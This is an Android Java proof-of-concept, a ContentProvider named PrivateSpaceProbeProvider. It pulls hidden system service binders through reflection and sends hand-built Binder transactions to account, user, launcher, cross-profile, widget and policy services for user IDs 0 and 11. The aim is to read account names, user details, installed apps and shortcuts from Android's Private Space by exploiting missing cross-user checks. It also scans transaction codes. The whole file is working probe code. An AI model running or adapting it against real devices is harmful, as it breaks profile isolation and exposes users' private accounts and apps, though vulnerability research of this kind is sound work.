package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class PrivateSpaceProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        // Focus: services with userId parameter where cross-user check might be missing
        testAccountManager(cursor);
        testUserManager(cursor);
        testDevicePolicyManager(cursor);
        testLauncherApps(cursor);
        testCrossProfileApps(cursor);
        testAppWidgetService(cursor);
        testRestrictionsManager(cursor);

        return cursor;
    }

    private void testAccountManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("account");
        if (binder == null) { cursor.addRow(new Object[]{"account", "no_binder"}); return; }
        String desc = "android.accounts.IAccountManager";

        // TX=4: getAccountsForPackage(String packageName, int uid, String opPackageName)
        // TX=5: getAccountsByTypeForPackage(String type, String pkg, String opPkg)
        // TX=6: getAccountsAsUser(String type, int userId, String opPkg)
        // This could expose accounts from Private Space!
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(null); // type (null = all)
                data.writeInt(userId);
                data.writeString(getContext().getPackageName());
                binder.transact(6, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"accounts_u" + userId, "SUCCESS avail=" + avail});
                    if (avail > 4) {
                        // Account[] - first read count
                        int count = reply.readInt();
                        cursor.addRow(new Object[]{"accounts_u" + userId + "_count", String.valueOf(count)});
                        for (int i = 0; i < Math.min(count, 10); i++) {
                            try {
                                String name = reply.readString();
                                String type = reply.readString();
                                String accessId = reply.readString();
                                cursor.addRow(new Object[]{"account_u" + userId + "_" + i,
                                    "name=" + truncate(name) + " type=" + type});
                            } catch (Exception e) {
                                cursor.addRow(new Object[]{"account_u" + userId + "_" + i, "parseErr"});
                                break;
                            }
                        }
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"accounts_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"accounts_u" + userId, "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=4: getAccountsForPackage - try getting accounts visible to specific package
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("com.android.systemui"); // packageName
            data.writeInt(1000); // system uid
            data.writeString(getContext().getPackageName());
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"accounts_systemui", "SUCCESS avail=" + avail});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"accounts_systemui", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"accounts_systemui", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testUserManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("user");
        if (binder == null) { cursor.addRow(new Object[]{"user", "no_binder"}); return; }
        String desc = "android.os.IUserManager";

        // TX=6: getUserInfo(int userId) - get info about any user
        for (int userId : new int[]{0, 11, 10, 150}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(6, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    if (avail > 4) {
                        int nonNull = reply.readInt();
                        if (nonNull != 0) {
                            int id = reply.readInt();
                            String name = reply.readString();
                            String iconPath = reply.readString();
                            int flags = reply.readInt();
                            cursor.addRow(new Object[]{"user_" + userId, "id=" + id + " name=" + name + " flags=0x" + Integer.toHexString(flags)});
                        } else {
                            cursor.addRow(new Object[]{"user_" + userId, "null (not exist)"});
                        }
                    } else {
                        cursor.addRow(new Object[]{"user_" + userId, "empty"});
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"user_" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"user_" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=7: getUsers(boolean excludePartial, boolean excludeDying, boolean excludePreCreated)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // excludePartial
            data.writeInt(0); // excludeDying
            data.writeInt(0); // excludePreCreated
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getUsers", "SUCCESS avail=" + avail});
                if (avail > 4) {
                    int count = reply.readInt();
                    cursor.addRow(new Object[]{"users_count", String.valueOf(count)});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getUsers", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getUsers", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=16: getProfileIds(int userId, boolean enabledOnly)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // userId
            data.writeInt(0); // enabledOnly
            binder.transact(16, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getProfileIds", "SUCCESS avail=" + avail});
                if (avail > 4) {
                    int count = reply.readInt();
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(count, 10); i++) {
                        sb.append(reply.readInt()).append(",");
                    }
                    cursor.addRow(new Object[]{"profileIds", "count=" + count + " ids=" + sb});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"getProfileIds", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getProfileIds", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=28: isUserUnlocked(int userId) - check if Private Space is unlocked
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(28, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int unlocked = reply.readInt();
                    cursor.addRow(new Object[]{"isUnlocked_u" + userId, "unlocked=" + unlocked});
                } else {
                    cursor.addRow(new Object[]{"isUnlocked_u" + userId, "Ex=" + ex});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"isUnlocked_u" + userId, "ERR"});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testDevicePolicyManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("device_policy");
        if (binder == null) { cursor.addRow(new Object[]{"dpm", "no_binder"}); return; }
        String desc = "android.app.admin.IDevicePolicyManager";

        // TX codes for info disclosure (large interface, 200+ methods)
        // Try some that might work without permission:
        // getStorageEncryptionStatus, isDeviceProvisioned, etc.

        // TX=76: getStorageEncryptionStatus(String callerPackage, int userId)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(0);
            binder.transact(76, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int status = reply.readInt();
                cursor.addRow(new Object[]{"dpm_encryptionStatus", "status=" + status});
            } else {
                cursor.addRow(new Object[]{"dpm_encryptionStatus", "Ex=" + ex});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"dpm_encryptionStatus", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void testLauncherApps(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("launcherapps");
        if (binder == null) { cursor.addRow(new Object[]{"launcher", "no_binder"}); return; }
        String desc = "android.content.pm.ILauncherApps";

        // TX=1: addOnAppsChangedListener(String callingPackage, IOnAppsChangedListener listener)
        // Can we register a listener that monitors app installs/changes across profiles?
        IBinder listenerBinder = new android.os.Binder() {
            @Override
            protected boolean onTransact(int code, Parcel d, Parcel r, int flags) {
                if (r != null) r.writeNoException();
                return true;
            }
            @Override
            public String getInterfaceDescriptor() { return "android.content.pm.IOnAppsChangedListener"; }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeStrongBinder(listenerBinder);
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            cursor.addRow(new Object[]{"launcher_addListener", ex == 0 ? "SUCCESS" : "Ex=" + ex + "|" + truncate(reply.readString())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"launcher_addListener", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=4: getLauncherActivities(String callingPackage, String pkg, UserHandle user)
        // Can a non-default-launcher app enumerate activities in Private Space?
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null); // pkg (null = all)
                // UserHandle parcelable
                data.writeInt(1); // non-null
                data.writeInt(userId); // UserHandle.mHandle
                binder.transact(4, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"launcher_activities_u" + userId, "SUCCESS avail=" + avail});
                    if (avail > 8) {
                        // ParceledListSlice
                        int count = reply.readInt();
                        cursor.addRow(new Object[]{"launcher_activities_u" + userId + "_count", String.valueOf(count)});
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"launcher_activities_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"launcher_activities_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=11: getShortcuts(String callingPackage, ShortcutQueryWrapper query, UserHandle user)
        // Can we get shortcuts from other apps including Private Space?
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                // ShortcutQueryWrapper parcelable - write minimal
                data.writeInt(1); // non-null
                data.writeLong(0); // changedSince
                data.writeString(null); // package
                data.writeInt(-1); // null shortcutIds list
                data.writeInt(-1); // null locusIds list
                data.writeInt(-1); // null componentName
                data.writeInt(0x000F); // queryFlags (all types)
                // UserHandle
                data.writeInt(1); // non-null
                data.writeInt(userId);
                binder.transact(11, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"launcher_shortcuts_u" + userId, "SUCCESS avail=" + avail});
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"launcher_shortcuts_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"launcher_shortcuts_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testCrossProfileApps(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("crossprofileapps");
        if (binder == null) { cursor.addRow(new Object[]{"crossprofile", "no_binder"}); return; }
        String desc = "android.content.pm.ICrossProfileApps";

        // TX=1: getTargetUserProfiles(String callingPackage)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"crossprofile_targets", "SUCCESS avail=" + avail});
                if (avail > 4) {
                    int count = reply.readInt();
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(count, 10); i++) {
                        int nn = reply.readInt();
                        if (nn != 0) {
                            int userId = reply.readInt();
                            sb.append(userId).append(",");
                        }
                    }
                    cursor.addRow(new Object[]{"crossprofile_userIds", sb.toString()});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"crossprofile_targets", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"crossprofile_targets", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Scan all TX codes
        for (int tx = 2; tx <= 8; tx++) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"crossprofile_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int exCode = reply.readInt();
                    if (exCode == 0) {
                        cursor.addRow(new Object[]{"crossprofile_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"crossprofile_tx" + tx, "Ex=" + exCode + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"crossprofile_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testAppWidgetService(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("appwidget");
        if (binder == null) { cursor.addRow(new Object[]{"appwidget", "no_binder"}); return; }
        String desc = "com.android.internal.appwidget.IAppWidgetService";

        // TX=2: getInstalledProvidersForProfile(int categoryFilter, int profileId, String packageName)
        // Could reveal apps installed in Private Space that provide widgets
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(0x1F); // all categories
                data.writeInt(userId);
                data.writeString(null); // all packages
                data.writeString(getContext().getPackageName());
                binder.transact(2, data, reply, 0);
                int ex = reply.readInt();
                if (ex == 0) {
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"widget_providers_u" + userId, "SUCCESS avail=" + avail});
                    if (avail > 8) {
                        int count = reply.readInt();
                        cursor.addRow(new Object[]{"widget_providers_u" + userId + "_count", String.valueOf(count)});
                    }
                } else {
                    String msg = reply.readString();
                    cursor.addRow(new Object[]{"widget_providers_u" + userId, "Ex=" + ex + "|" + truncate(msg)});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"widget_providers_u" + userId, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void testRestrictionsManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("restrictions");
        if (binder == null) { cursor.addRow(new Object[]{"restrictions", "no_binder"}); return; }
        String desc = "android.content.IRestrictionsManager";

        // TX=1: getApplicationRestrictions(String packageName)
        // TX=2: hasRestrictionsProvider()
        for (int tx = 1; tx <= 5; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"restrict_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex = reply.readInt();
                    if (ex == 0) {
                        cursor.addRow(new Object[]{"restrict_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"restrict_tx" + tx, "Ex=" + ex + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"restrict_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
